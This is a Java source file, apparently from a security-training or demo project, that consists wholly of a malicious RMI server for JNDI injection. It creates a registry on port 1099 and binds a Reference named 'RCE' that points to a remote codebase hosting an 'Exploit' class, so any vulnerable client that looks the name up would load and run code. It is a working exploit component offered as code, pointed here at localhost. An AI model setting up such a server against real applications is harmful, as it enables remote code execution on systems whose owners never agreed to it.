package com.madaha.codesecone.controller.jndi.RmiEvilTest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServerEvil {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exploit","Exploit","http://127.0.0.1:65500/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("RCE",wrapper);
    }
}
